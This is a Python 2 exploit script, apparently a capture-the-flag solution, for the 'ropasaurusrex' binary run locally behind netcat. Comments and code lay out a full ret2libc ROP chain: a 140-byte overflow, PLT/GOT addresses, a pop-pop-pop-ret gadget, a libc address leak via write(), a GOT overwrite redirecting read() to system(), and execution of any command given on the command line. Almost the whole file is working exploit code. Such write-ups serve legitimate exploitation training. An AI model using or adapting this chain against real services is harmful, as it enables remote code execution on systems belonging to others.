#!/usr/bin/env python

import socket
import struct
import sys
from time import sleep

# start ropasaurusrex on local port 1337
# while true; do nc -nlvp 1337 -e ./ropasaurusrex; done
# confirm running by
# netstat -antp | grep 1337

# start gdb
# sudo gdb -q
# attach to nc process
# attach 12785

# confirm if ASLR is enabled
# check if randomize_va_space is above 0
# cat /proc/sys/kernel/randomize_va_space
# or see if linked libraries are at different addresses in multiple runs of
# ldd ropasaurusrex

# find section in binary to write command to
# look for sections that are not READONLY and are large enough (e.g. .dynamic)
# objdump -x ropasaurusrex
# found following:
#Sections:
#Idx Name          Size      VMA       LMA       File off  Algn
#20 .dynamic      000000d0  08049530  08049530  00000530  2**2
#                 CONTENTS, ALLOC, LOAD, DATA
dynamic_section = struct.pack("<I", 0x08049530)
command_buffer = dynamic_section

# find offset of eip overwrite using gdb-peda
# gdb-peda$ pattern_offset 200 pattern.txt
# gdb-peda$ run < pattern.txt
# Stopped reason: SIGSEGV
# 0x41416d41 in ?? ()
# gdb-peda$ pattern_offset 0x41416d41
# 1094806849 found at offset: 140
padding_before_eip_overwrite = 140 * "A"

# find dynamic relocation table entries (GOT) to see what functions are available
# objdump -R ropasaurusrex
# DYNAMIC RELOCATION RECORDS
# OFFSET   TYPE              VALUE
# 08049614 R_386_JUMP_SLOT   write@GLIBC_2.0
# 0804961c R_386_JUMP_SLOT   read@GLIBC_2.0
read_got_address = struct.pack("<I", 0x0804961c)
# find PLT address of those functions
# objdump -D ./ropasaurusrex | grep read
# 0804832c <read@plt>:
read_plt_address = struct.pack("<I", 0x0804832c)
# objdump -D ./ropasaurusrex | grep write
# 0804830c <write@plt>:
write_plt_address = struct.pack("<I", 0x0804830c)

# find rop gadget to use for chaining
# ropper --file ropasaurusrex --search pop
# 0x080484b6: pop esi; pop edi; pop ebp; ret;
pppr_gadget = struct.pack("<I", 0x080484b6)
# or
# ROPgadget --binary ropasaurusrex | grep pop

# find offset of read() and system() in libc
# ldd ropasaurusrex
# libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7562000)
# objdump -d /lib/i386-linux-gnu/libc.so.6 | grep _read | less
libc_read_offset = 0x000d5c00
# objdump -d /lib/i386-linux-gnu/libc.so.6 | grep system | less
libc_system_offset = 0x0003ad80

# define stdin and stdout
stdin = struct.pack("<I", 0)
stdout = struct.pack("<I", 1)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 1337))

# read command from first arg
cmd = sys.argv[1] + "\0"

payload = ""
payload += padding_before_eip_overwrite

# write command to .dynamic section
# stack for read should look like:
# [return_address]
# [int fd]
# [void *buf]
# [size_t count]
payload += read_plt_address
payload += pppr_gadget # gadget to return to the next instruction below
payload += stdin # fd which is stdin in this case
payload += command_buffer # void *buf which is the start of .dynamic section
payload += struct.pack("I", len(cmd)) # size_t count which is length of command passed in

# read the randomized libc address of the read() function from the GOT by using write() to stdout
# stack for write should look like this:
# [return_address]
# [int file]
# [void *buffer]
# [size_t count]
payload += write_plt_address
payload += pppr_gadget # gadget to return to the next instruction below
payload += stdout # fd which is stdout in this case
payload += read_got_address # void *buffer is the read() GOT entry address
payload += struct.pack("<I", 4) # size_t count is 4 because 32bit binary address is 4 bytes

# write the randomized libc address of system() to the read() entry in the PLT
# stack for write should look like this:
# [return_address]
# [int fd]
# [void *buf]
# [size_t count]
payload += read_plt_address
payload += pppr_gadget # gadget to return to the next instruction below
payload += stdin # fd which is stdin in this case
payload += read_got_address # void *buf which is the read() GOT entry address
payload += struct.pack("I", 4) # size_t count which is length of a 32bit address

# call read() which actually now points to system with cmd as arg
payload += read_plt_address
payload += "BBBB" # bogus return address that we dont care about
payload += command_buffer # dynamic section contains our command that we wrote to earlier

s.send(payload) # send payload
sleep(0.2)
s.send(cmd) # send command (first instruction is to read from stdin)
sleep(0.2)
libc_read_address = struct.unpack("<I", s.recv(1024))[0]
print "The libc read() function is at 0x%.8x" % libc_read_address
libc_system_address = libc_read_address - libc_read_offset + libc_system_offset
print "The libc system() function is at 0x%.8x" % libc_system_address
sleep(0.2)
s.send(struct.pack("<I", libc_system_address)) # send address of system, 3rd instruction asks for address from stdin
sleep(0.2)
print s.recv(1024) # recv the output of the system call

s.close()



































